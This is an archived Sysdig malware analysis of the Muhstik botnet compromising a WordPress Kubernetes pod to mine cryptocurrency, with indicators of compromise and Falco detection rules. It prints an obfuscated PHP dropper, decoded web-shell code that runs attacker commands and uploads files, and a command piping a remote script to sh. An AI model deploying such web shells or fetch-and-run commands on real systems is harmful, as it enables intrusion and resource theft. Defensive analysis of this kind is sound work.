{
    "id": "4b7f36a1-86b3-4b55-88c0-4f867f4aa817",
    "created_at": "2023-01-12T15:10:55.137923Z",
    "updated_at": "2025-03-27T02:05:43.571647Z",
    "deleted_at": null,
    "sha1_hash": "f4dfd01d4b6911ef47d70b608edc54d113cdb9c8",
    "title": "2021-11-16 - Hands-On Muhstik Botnet- crypto-mining attacks targeting Kubernetes",
    "authors": "",
    "file_creation_date": "2022-05-27T22:36:35Z",
    "file_modification_date": "2022-05-27T22:36:35Z",
    "file_size": 2696642,
    "plain_text": "# Hands-On Muhstik Botnet: crypto-mining attacks targeting Kubernetes\n\n**sysdig.com/blog/muhstik-malware-botnet-analysis/**\n\nBy Stefano Chierici November 16, 2021\n\nMalware is continuously mutating, targeting new services and platforms. The Sysdig\n**Security Research team has identified the famous Muhstik Botnet with new behavior,**\nattacking a Kubernetes Pod with the plan to control the Pod and mine cryptocurrency.\n\nA WordPress Kubernetes Pod was compromised by the Muhstik worm and added to the\nbotnet. On the Pod has been deployed and executed various types of crypto miners, like\n```\nxmra64 and xmrig64 .\n\n```\nThis attack confirms what we’ve been seeing for quite some time; Crypto miner attacks are\n**on the rise, and they come in many different forms. The fact that** crypto currency prices are\nover the roof is only making things worse.\n\nWe will cover the characteristics of Muhstik Malware, the step-by-step of this particular\nattack, and how to protect your infrastructure against it.\n\n## What is Muhstik Malware?\n\n\n-----\n\n**Muhstik malware has been around since 2017, and we assume that it is based on a fork of**\n**the Mirai code and is currently affecting the cloud by way of several web application**\nexploits.\n\nThe botnet is monetized via cryptomining and with DDoS attack services.\n\nIt targets a wide variety of web applications, including WordPress, Drupal, and WebDAV,\n[Oracle’s WebLogic application server, as well an assortment of Internet-of-Things (IoT) and](https://digital.nhs.uk/cyber-and-data-security/about-us/cyber-security-glossary#internet-of-things---IoT)\n[Small Office/Home Office (SOHO) devices.](https://digital.nhs.uk/services/data-security-centre/cyber-security-glossary#small-office-home-office---soho)\n\n[Muhstik uses its botnet to mount sizable distributed denial-of-service (DDoS) attacks, but it](https://digital.nhs.uk/services/data-security-centre/cyber-security-glossary#distributed-denial-of-service---ddos)\n[will also install several cryptocurrency](https://digital.nhs.uk/services/data-security-centre/cyber-security-glossary#cryptocurrency) [miners on affected systems.](https://digital.nhs.uk/cyber-and-data-security/about-us/cyber-security-glossary#miner)\n\n## Step-by-step Muhstik behavior\n\nLet’s start with a quick overview of the attack behavior and the main steps executed, from\nthe Pod compromisation to the cryptomining activities.\n\nThe attack uncovered went as follows:\n\n\n-----\n\n[1. WordPress admin login configured with default credentials in the honeypot account](https://attack.mitre.org/techniques/T1078/001/)\n\nwas attacked\n\n1. The `header.php file was used to upload a malicious PHP page`\n```\n    E3DC4533F48E7161DA720C6FD3591710.php\n\n```\n2. The malicious PHP code loads files and executes remote commands.\n2. The code pty3 uploaded was executed on the Pod.\n3. Then, `pty3 spawned a new process called` `ggop6b5pqkmfrfd and connected to the`\n\nbotnet.\n\n1. The file was copied in different directories.\n2. Created entry in file `rc.local for` [persistence.](https://attack.mitre.org/tactics/TA0003/)\n3. Created `/etc/inittab file using respawn function always for persistence.`\n4. `xmrig64 crypto miner binary was executed on the machine.`\n5. The malicious remote script was downloaded and executed on the Pod\n\n```\nhttp://118.24.84.121/wp-content/themes/twentyfifteen/kn | sh\n\n```\n\n1. Other pty files were downloaded and executed.\n6. Then, the `xmra64 crypto binary miner was downloaded from` `178.62.105.90` IP\n\naddresses and executed on the Pod using the mining pools on the `185.165.171.78,`\n```\n   185.86.148.14 IP addresses.\n\n```\nLet’s dig deeper into the details of this Muhstik malware, how this botnet works in detail, the\nexact commands that are run, the communication between the servers, and finally, how to\ndetect this attack with open source Falco.\n\n## Muhstik Malware in depth\n\n### #1 Initial access – Encrypted PHP web shell\n\n[Default WordPress credentials were exploited in our honeypot and the WordPress](https://attack.mitre.org/techniques/T1078/001/)\n```\nheader.php file was updated with the following string.\n\n```\nAs we can understand from the clear text code at the end, the PHP function\n```\nfile_put_contents was used to create a new file and put the encrypted code in it.\n<?php if (isset($_GET['t6'])) { $data = \"<?php\neval(gzinflate(str_rot13(base64_decode('rUl6QuNTEP6cVfkPgy862xKQhOOAWOK0SBsKKgJRTyuVO0\n ?>\"; file_put_contents(\"E3DC4533F48E7161DA720C6FD3591710.php\", $data); } ?>\n\n```\nTo find the real code executed, we need to revert the decryption process starting from the\nstring base64 we have here. In this case, we have a triple encoding:\n\n**Base_64 encoding: Method used to encode text or code to better send it without error**\nand bypass detection.\n**Rot13 substitution cipher: A simple shifting character rotation of ASCII letters.**\n\n\n-----\n\n**Compression: Gzip compression applied to get text which can be used via a web**\n‘POST’ requests.\n\nDecrypting the code added by the attacker, we can see it is a PHP web shell, used to\nexecute commands and upload files on the Pod. Let’s go deeper into the static analysis of\nthe most relevant part of the code.\n\nThe first part of the PHP code is used to download more malware files. We explain deeper in\nthe next section.\n```\nif (isset($_GET['wie'])) {\n  $arr = array(\"who\" => array(\"os_name\" => php_uname('s'), \"uname_version_info\" =>\nphp_uname('v'), \"machine_type\" => php_uname('m'), \"kernel\" => php_uname('r'),\n\"php_uname\" => php_uname(), \"is64bit\" => PHP_INT_SIZE === 4 ? false : true));\n  print (json_encode($arr));\n  exit;\n} elseif (isset($_GET['knal'])) {\n  $comd = $_GET['knal'];\n  echo \"<pre><font size=3 color=#000000>\" . shell_exec($comd) . \"</font></pre>\";\n  exit;\n} elseif (isset($_POST['submit'])) {\n  $uploaddir = pwd();\n  if (!$name = $_POST['newname']) {\n    $name = $_FILES['userfile']['name'];\n  }\n  move_uploaded_file($_FILES['userfile']['tmp_name'], $uploaddir . $name);\n  if (move_uploaded_file($_FILES['userfile']['tmp_name'], $uploaddir . $name)) {\n    echo \"Upload Failed\";\n  } else {\n    echo \"Upload Success to \" . $uploaddir . $name . \" :D \";\n  }...\n\n```\nHere, check the session and the authentication with the botnet.\n```\nif (!isset($_SESSION[md5($_SERVER['HTTP_HOST']) ])) {\n  if (empty($auth_pass) || (isset($_POST['pass']) && (md5($_POST['pass']) ==\n$auth_pass))) {\n    $_SESSION[md5($_SERVER['HTTP_HOST']) ] = true;\n  } else {\n    printLogin();\n  }\n}\n\n```\nThe PHP code below is used to obtain information about the current user, and is signed by\nthe Muhstik malware.\n\n\n-----\n\n```\necho \"<title>UnKnown - muhstik</title><br>\";\n$cur_user = \"(\" . get_current_user() . \")\";\necho \"<font size=2 color=#888888><b>User : uid=\" . getmyuid() . $cur_user . \" gid=\" .\ngetmygid() . $cur_user . \"</b><br>\";\necho \"<font size=2 color=#888888><b>Uname : \" . php_uname() . \"</b><br>\";\n\n```\nThis last portion of the PHP code is used as a backdoor communication to send the\ncommands from the botnet. We can observe `cmd,` `dir, or` `ls -la commands.`\n```\n  if (isset($_POST['command'])) {\n    $cmd = $_POST['cmd'];\n    echo \"<pre><font size=3 color=#000000>\" . shell_exec($cmd) . \"</font></pre>\";\n  } else {\n    if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {\n      echo \"<pre><font size=3 color=#000000>\" . shell_exec('dir') . \"</font>\n</pre>\";\n    } else {\n      echo \"<pre><font size=3 color=#000000>\" . shell_exec('ls -la') . \"</font>\n</pre>\";\n    }\n  }\n\n### #2 Propagation – pty3 dropped on the Pod\n\n```\nThe first malware file dropped and executed on the Pod using the web shell created was the\nbinary `pty3 . We use an external service to analyze the binary,` [Virustotal, which helps us to](https://www.virustotal.com/)\ndetect, with several AVs, what type of malware it is.\n\n\n-----\n\nThis particular binary was reported for the first time in April, 2021, and 32 intelligence\nsources have confirmed that it is, indeed, malware. There are a lot of versions of `pty3`\nmalware in the wild that are related to the Muhstik botnet, however, it seems to be a recent\n**version.**\n\nIn our malware analysis, we use our honeypot to follow the malware behavior and its goal.\n\nIf this were a regular production server, we would have a plan to incident response,\nimmediately isolate the binary, investigate the source, and enhance our security for\n**future incidents.**\n\n### #3 Runtime analysis – pty3 malware executed inside the Pod\n\nThe malware file `pty3 was executed right after it was dropped on the Pod. To follow what`\n```\npty3 is doing, we used the open source tool, Sysdig Inspect, to visualize system calls.\n\n```\nLet’s see the activities performed by the malware in detail.\n\n**#3.1 Checking network tools running in the Pod**\n\nAs the first action, the malware checks if network dump tools are in execution in the Pod.\nThe two binaries checked are `tcpdump and` `strace .`\n\n\n-----\n\nThis is a typical process to discover and identify new targets to infect with the malware, using\n[system binaries in the process or GTFOBins.](https://gtfobins.github.io/#tc)\n\n**#3.2 Persistence phase**\n\nTo make sure the Muhstik malware will be rerun if the process dies or the machine is\nrestarted, the malware needs to spread itself in the Pod and perform some actions.\n\nIn this case, the `pty3 binary performed special measures to achieve persistence in the`\nmachine.\n\nFirst of all, the `pty3 started copying itself in different directories for persistence purpose:`\n\n_/tmp/pty3_\n_/dev/shm/pty3_\n_/var/tmp/pty3_\n_/var/lock/pty3_\n_/var/run/pty3_\n\nThen, it tried to execute crontab, although the crontab binary wasn’t available inside the Pod.\nIt succeeded instead of executing persistence via `/etc/inittab, adding the following`\nlines.\n\n\n-----\n\nUsing the `respawn function ensures that if the process dies, it will be respawned`\nautomatically without losing the compromised host/Pod.\n\nThe Muhstik malware also added itself in the `rc.local file for the same purposes as`\nshown in the following screenshot.\n\n**#3.3 Establishing C&C communication with the Botnet**\n\nAt this point, the malware needs to communicate and send instructions to the zombie Pod.\nIn the following image, we can see the PING / PONG communication between the process\n```\nggop6b5pqkmfrfd and the webserver.\n\n```\n\n-----\n\nIt resembles other malware and C&C protocols, capturing information about the target and\ncommunicating back with updated attack payloads.\n\nLet’s stop for a moment to summarize the activities done so far by the malware dropped:\n\n[1. Spawn a new process to connect to the botnet.](https://attack.mitre.org/techniques/T1583/005/)\n[2. Check tools running inside the host/Pod to discover new Pods to infect.](https://attack.mitre.org/tactics/TA0007/)\n3. Replicate itself in different locations for [persistence.](https://attack.mitre.org/tactics/TA0003/)\n[4. Run crontab by creating and editing](https://attack.mitre.org/techniques/T1053/003/) `/etc/inittab to get persistence.`\n\n### #4 Crypto miners in action\n\nThe goal of the Muhstik botnet, after infecting the victim, is to monetize the resources it\ninfects. Muhstik malware downloads two binaries in the Kubernetes Pods it controls, and\nstarts cryptomining.\n\n**#4.1** `xmrig64 binary downloaded and executed on the Pod`\n\nOnce the malware infection is complete, after having connected the Pod to the botnet, the\nattacker uploaded and executed the `xmrig64 binary using the PHP web shell.`\n\n[From the screen below, using Inspect, we can detect the miner connecting to the IP pool](https://github.com/draios/sysdig-inspect/)\n186.86.148.14 with port 8081 and start sharing information.\n\n\n-----\n\n**#4.2** `xmra64 binary behavior`\n\nUsing the `ggop6b5pqkmfrfd process running in the Pod, the Muhstik botnet downloaded`\nthe crypto miner binary `xmra64 from the IP` `178.62.105.90 executing the` `wget and`\n```\ncurl commands.\n\n```\n\n-----\n\nOnce downloaded, `ggop6b5pqkmfrfd prepared the binary for execution. We can see how`\nit used chmod to set the execution bit.\n\nWe uploaded this `xmra64 binary again and the report was very similar. It is a well-known`\ncrypto miner.\n\nTwo crypto miner pools were specified when launching the crypto miner binary:\n```\n   185.165.171.78\n   185.86.148.14\n\n```\nFrom the following screen, we can see the miner started communicating with the pool.\n\n### #5 More malware binaries – Other pty files dropped on the Pod\n\n\n-----\n\nAfter running the first miner, the other `pty files were dropped on the Pod downloading and`\nexecuting a script, which we detect again with Inspector.\n\nLooking at the file downloaded, we can see the code executed and from where the file was\ndownloaded.\n\nWe can see the file `pty*, which might be different versions of the` `pty3 file executed`\nbefore, are downloaded from the IP `167.99.39.134/.x/.`\n\n### Summary of IOC and suspicious activities\n\n**IPs & URLs**\n\nhttp://118.84.24.121:80/wp-content/themes/twentyfifteen/kn\n\n\n-----\n\nhttp://167.99.39.134/.x/\nhttp://178.62.105.90:80/wp-content/themes/twentyfifteen/xmra64\n185.86.148.14:8081\n185.165.171.78:8081\n46.149.233.35:8080\n\n**Files and their MD5:**\n\n```\nE3DC4533F48E7161DA720C6FD3591710.php\n\n```\n\n4dc3298cdbf565cc897a922807a2809667535c5a\n\n```\npty3\n\n```\n\n61586a0c47e3ae120bb53d73e47515da4deaefbb\n\n```\nxmrig64\n\n```\n\nde64b454420c64fc160a9c6c705896ae0e26d8db\n\n```\nxmra64\n\n```\n\n497f4e24464a748c52f92de1fba33551\n\n**Suspicious activities**\n\nThere are a few suspicious activities worth mentioning in our Muhstik malware analysis:\n```\n   wget is launched in runtime, not build time.\n\n```\nNetwork communication with the miner pool.\nA CPU usage surge due to an unknown process launched.\n\nOnce we have identified these activities, we see how we can perform their detection.\n\n## Detecting the Muhstik botnet with Falco\n\n[Falco is the CNCF open-source project for runtime threat detection for containers and](https://falco.org/)\nKubernetes.\n\nOne of the benefits of Falco is in leveraging its powerful and flexible rules language. As a\nresult, Falco will generate security events when it finds abnormal behaviors, as defined by a\ncustomizable set of rules. Meanwhile, Falco comes with a handful of out-of-the-box\n**detection rules.**\n\nCustomizing the rules reported here, it’s possible to detect crypto miners’ behaviors\nthrough connections using the IPs mentioned in this article, and proactively detect other\n**connections to well-known crypto miners’ domains.**\n\n\n-----\n\n```\n# Note: falco will send DNS request to resolve miner pool domain which may trigger\nalerts in your environment.\n- rule: Detect outbound connections to common miner pool ports\n desc: Miners typically connect to miner pools on common ports.\n condition: net_miner_pool and not trusted_images_query_miner_domain_dns\n exceptions:\n  - name: proc_sport_sipname\n   fields: [proc.name, fd.sport, fd.sip.name]\n enabled: false\n output: Outbound connection to IP/Port flagged by cryptoioc.ch\n(command=%proc.cmdline port=%fd.rport ip=%fd.rip container=%container.info\nimage=%container.image.repository)\n priority: CRITICAL\n tags: [network, mitre_execution]\n- rule: Container Drift Detected (chmod)\n desc: New executable created in a container due to chmod\n condition: >\n  chmod and\n  consider_all_chmods and\n  container and\n  not runc_writing_var_lib_docker and\n  not user_known_container_drift_activities and\n  evt.rawres>=0 and\n  ((evt.arg.mode contains \"S_IXUSR\") or\n  (evt.arg.mode contains \"S_IXGRP\") or\n  (evt.arg.mode contains \"S_IXOTH\"))\n exceptions:\n  - name: proc_name_image_suffix\n   fields: [proc.name, container.image.repository]\n   comps: [in, endswith]\n  - name: cmdline_file\n   fields: [proc.cmdline, fd.name]\n   comps: [in, in]\n   values:\n    - [[\"runc:[1:CHILD] init\"], [/exec.fifo]]\n output: Drift detected (chmod), new executable created in a container\n(user=%user.name user_loginuid=%user.loginuid command=%proc.cmdline\nfilename=%evt.arg.filename name=%evt.arg.name mode=%evt.arg.mode event=%evt.type)\n priority: ERROR\n- rule: Outbound Connection to C2 Servers\n desc: Detect outbound connection to command & control servers\n condition: outbound and fd.sip in (c2_server_ip_list)\n exceptions:\n  - name: proc_proto_sport\n   fields: [proc.name, fd.l4proto, fd.sport]\n output: Outbound connection to C2 server (command=%proc.cmdline connection=%fd.name\nuser=%user.name user_loginuid=%user.loginuid container_id=%container.id\nimage=%container.image.repository)\n priority: WARNING\n tags: [network]\n\n```\nYou can see the [full rule descriptions on GitHub.](https://github.com/falcosecurity/falco/blob/master/rules/falco_rules.yaml#L2840)\n\n\n-----\n\n[If you would like to find out more about Falco, check out the Falco project on GitHub.](https://github.com/falcosecurity/falco)\n\n## Detecting the Muhstik with Sysdig Secure\n\nThe [Sysdig Secure DevOps Platform is built on top of Falco, and was used to detect this](https://sysdig.com/platform-architecture/)\nparticular attack.\n\n[With the help of Sysdig Secure image profiling, DevOps can:](https://sysdig.com/blog/sysdig-secure-2-4/)\n\nCreate a policy to detect any port bind and listen to activities from random processes.\nCreate a policy to detect any destination IPs that are not on the white list.\nCreate a policy to detect any processes launched that are not in the whitelist (e.g.,\n```\n   wget, pty*, xmrig64, xmra64 ).\n\n```\nThe miner_ports list is already part of the Out of the Box rules for [Sysdig Secure. The](https://sysdig.com/products/secure/)\n_cryptominer_IP_IOC instead includes the IPs reported in the IoCs section, related to the_\nminer activities.\n\n\n-----\n\n## Conclusion\n\nThis incident confirms a trend of cryptomining attacks being on the rise, and they are\ngetting more creative as time goes on. The Sysdig research team analyzes other malware,\n[like serv-hello or](https://sysdig.com/blog/crypto-sysrv-hello-wordpress/) [Shellbot, with similar behavior.](https://sysdig.com/blog/malware-analysis-shellbot-sysdig/)\n\nAs a system administrator, you must use the proper tools to prevent and detect these\nattacks. Without deep insight into the process activities, file activities, and network activities\nfrom your cloud native environment, and the help from a smart detection engine, it will be\nhard to detect such an attack. It will be even more difficult to uncover it.\n\nIt is also important to note that unified security and monitoring solutions will speed up the\ninvestigation process. Once you identify a single suspicious event, it helps you trace down\nthe event from different angles, such as resource usage, network connections, and reading\nsensitive files.\n\n_At_ _[Sysdig Secure, we extend Falco with out-of-the-box rules, along with other open source](https://sysdig.com/products/secure/)_\n_projects, making it even easier to work with and manage Kubernetes security._ _Register for_\n_our free 30-day trial and see for yourself!_\n\n_The_ _[Sysdig Secure DevOps Platform provides security to confidently run containers,](https://sysdig.com/platform-architecture/)_\n_Kubernetes, and cloud services. With Sysdig, you can secure the build pipeline, detect and_\n_respond to runtime threats, continuously validate compliance, and monitor and troubleshoot_\n_[cloud infrastructure and services. Try it today!](https://sysdig.com/company/free-trial/)_\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-11-16 - Hands-On Muhstik Botnet- crypto-mining attacks targeting Kubernetes.pdf"
    ],
    "report_names": [
        "2021-11-16 - Hands-On Muhstik Botnet- crypto-mining attacks targeting Kubernetes.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673536255,
    "ts_updated_at": 1743041143,
    "ts_creation_date": 1653690995,
    "ts_modification_date": 1653690995,
    "files": {
        "pdf": "https://archive.orkl.eu/f4dfd01d4b6911ef47d70b608edc54d113cdb9c8.pdf",
        "text": "https://archive.orkl.eu/f4dfd01d4b6911ef47d70b608edc54d113cdb9c8.txt",
        "img": "https://archive.orkl.eu/f4dfd01d4b6911ef47d70b608edc54d113cdb9c8.jpg"
    }
}